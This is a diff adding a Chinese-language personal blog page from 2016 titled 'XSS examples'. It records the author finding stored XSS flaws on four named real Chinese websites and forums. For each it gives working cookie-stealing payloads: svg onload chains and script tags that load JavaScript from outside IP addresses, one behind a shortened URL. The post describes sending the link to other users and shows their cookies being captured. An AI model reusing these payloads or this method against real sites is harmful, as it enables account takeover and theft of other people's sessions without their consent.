@@ -1,0 +1,165 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>xss实例 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="xss实例"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-22T07:08:13.000Z"><a href="/2016/07/22/xss实例/">2016-07-22</a></time>
+      
+      
+  
+    <h1 class="title">xss实例</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#时光网#<br>登录之后<br>有一个我关注的话题然后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"><br>并没有转换为实体编码，有xss漏洞<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"><br>在控制台测试函数$loadjs函数可以利用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br>用$loadjs()函数构造payload<br><a href="http://163.44.171.86/ssss.js" target="_blank" rel="external">http://163.44.171.86/ssss.js</a></p>
+<p><a href="svg/onload=”b=’http://’163”">svg/onload=”b=’http://’163”</a></p>
+<p><svg onload="”b+=’.44.171.86’”"/></p>
+<p><svg onload="”b+=’/ssss.js’”"/></p>
+<p><svg onload="”$loadjs(b)”"><br/>查看一下有没有转换<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"/><br/>没有转换为实体编码应该就可以了<br/>发链接给别人<br/>获取cookie<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"/></svg></p>
+<p>#南方人物周刊xss实验报告#<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"><br>存在xss的点，每次加载都会弹出来<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"><br>查看网页源代码，发现网页有两个地方触发了js<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"><br>一个是标题的地方<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"><br>一个是会员的姓名<br>第二个对于我们来说是可以控制的，然后我们就可以利用构造payload<br>缩短前的网址<a href="http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4" target="_blank" rel="external">http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4</a><br>重新构造payload：payload：<script src="”http://t.im/16ar4”"><br>让网页加载外部服务器中构造的JS文件<br>发现有长度限制，还是不行</p>
+<p>#唯宝网#</p>
+<p>发现在写日记哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"><br>于是我换成获取饼干的js代码”/&gt;<script src='http://115.159.126.186/x.js'></script>  并在源码中插入有效成功</p>
+<p>中兴论坛<br>发帖哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"><br>然后抓包<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8714.png?raw=true" alt="image"><br>在我的444后面写上服务器的网址</p>
+<p><script src="http://163.44.171.86/ssss.js"></script><br>获取到cookie的信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8715.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/22/xss实例/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
